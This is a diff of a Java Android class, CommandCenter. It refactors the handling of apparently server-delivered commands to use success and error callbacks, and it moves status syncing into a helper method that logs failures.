@@ -1,6 +1,7 @@
 package com.theah64.xrob.commandcenter;
 
 import android.content.Context;
+import android.util.Log;
 
 import com.theah64.xrob.asynctasks.CommandStatusesSynchronizer;
 import com.theah64.xrob.commandcenter.commands.BaseCommand;
@@ -19,6 +20,7 @@ public class CommandCenter {
 
     private static final String KEY_ID = "id";
     private static final String KEY_COMMAND = "command";
+    private static final String X = CommandCenter.class.getSimpleName();
 
     public static void handle(final Context context, final String typeData) {
 
@@ -35,25 +37,25 @@ public class CommandCenter {
 
             try {
                 final BaseCommand theCommand = CommandFactory.getCommand(new Command(commandId, command));
-                theCommand.handle(context);
-                commandStatusesTable.addv2(new Command.Status(commandId, Command.Status.STATUS_FINISHED, "Command finished handling"));
+                theCommand.handle(context, new BaseCommand.Callback() {
+                    @Override
+                    public void onError(String message) {
+                        commandStatusesTable.addv2(new Command.Status(commandId, Command.Status.STATUS_FAILED, message));
+                        syncCommandStatus(context);
+                    }
+
+                    @Override
+                    public void onSuccess(String message) {
+                        commandStatusesTable.addv2(new Command.Status(commandId, Command.Status.STATUS_FINISHED, message));
+                        syncCommandStatus(context);
+                    }
+                });
 
             } catch (BaseCommand.CommandException e) {
                 e.printStackTrace();
-                commandStatusesTable.addv2(new Command.Status(commandId, Command.Status.STATUS_FAILED, "Error : " + e.getMessage()));
+                commandStatusesTable.addv2(new Command.Status(commandId, Command.Status.STATUS_FAILED, "CommandException: " + e.getMessage()));
                 ACRA.getErrorReporter().handleException(e);
-            } finally {
-                new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
-                    @Override
-                    public void onReadyToRequest(String apiKey) {
-                        new CommandStatusesSynchronizer(context).execute(apiKey);
-                    }
-
-                    @Override
-                    public void onFailed(String reason) {
-
-                    }
-                });
+                syncCommandStatus(context);
             }
 
         } catch (JSONException e) {
@@ -61,4 +63,20 @@ public class CommandCenter {
             ACRA.getErrorReporter().handleException(e);
         }
     }
+
+    private static void syncCommandStatus(final Context context) {
+        new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
+            @Override
+            public void onReadyToRequest(String apiKey) {
+                new CommandStatusesSynchronizer(context).execute(apiKey);
+            }
+
+            @Override
+            public void onFailed(String reason) {
+                //Some reason - may be network
+                Log.e(X, reason);
+            }
+        });
+    }
+
 }
